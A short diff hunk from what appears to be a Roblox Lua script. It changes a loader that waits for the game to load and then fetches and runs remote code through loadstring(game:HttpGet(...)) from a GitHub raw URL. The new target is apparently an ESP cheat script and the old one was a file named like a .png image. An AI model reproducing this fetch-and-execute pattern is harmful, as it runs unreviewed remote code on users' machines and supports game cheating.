@@ -37,7 +37,7 @@ end
 
 local SCRIPT_LOADER_CODE = [[
     repeat task.wait() until game:IsLoaded()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/T4H4KER/Test/refs/heads/main/1781919848774.png"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/T4H4KER/Test/refs/heads/main/ESP.lua"))()
 ]]
 
 --==================================================
